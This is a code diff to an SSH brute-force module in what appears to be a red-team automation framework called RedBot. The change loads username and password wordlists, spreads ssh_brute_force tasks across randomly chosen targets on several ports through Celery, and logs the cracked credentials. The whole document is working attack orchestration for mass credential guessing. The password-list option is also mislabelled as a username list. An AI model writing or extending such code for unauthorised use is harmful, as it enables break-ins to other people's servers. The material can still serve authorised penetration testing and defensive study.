@@ -2,9 +2,10 @@ import socket
 from typing import List
 
 import paramiko
+from celery import group
 
 from redbot.core.async import celery
-from redbot.core.utils import random_targets
+from redbot.core.utils import random_targets, get_file
 from redbot.modules import Attack
 
 
@@ -24,7 +25,7 @@ class SSHAttack(Attack):
         },
         'passlist': {
             'name': 'Password List',
-            'default': 'users.txt',
+            'default': 'pass.txt',
             'description': 'Path to a wordlist containing one username per line. Accepts file paths within the '
                            'RedBot "files" directory, or a valid HTTP(S) URL.'
         },
@@ -39,7 +40,7 @@ class SSHAttack(Attack):
     @classmethod
     def push_update(cls, data):
         if data.get('status') == 'PROGRESS':
-            cls.log('Starting SSH attack on ' + data['result']['target'])
+            cls.log('Starting SSH attack on ' + str(data['result']['target']))
         elif data.get('status') == 'DONE':
             cls.log('Finished SSH attack on {}, username "{}" password "{}"'.format(data['result']['target'],
                                                                                     data['result']['username'],
@@ -49,12 +50,13 @@ class SSHAttack(Attack):
     @classmethod
     def run_attack(cls):
         cls.log("Starting SSH attack.")
-        r = []
-        users, passwords = None, None
-        for target in random_targets():
-            r.append(ssh_brute_force.delay(target, users=users, passwords=passwords))
-        for status in r:
-            status.get(on_message=cls.push_update, propagate=False)
+        print(cls.get_setting('userlist'))
+        with open(get_file(cls.get_setting('userlist'))) as ul, open(get_file(cls.get_setting('passlist'))) as pl:
+            users = ul.readlines()
+            passwords = pl.readlines()
+        targets = (random_targets(int(port)) for port in cls.get_setting('ports').replace(' ', '').split(','))
+        g = group(ssh_brute_force.s(target, users=users, passwords=passwords) for target in targets)()
+        g.get(on_message=cls.push_update, propagate=False)
 
 
 cls = SSHAttack
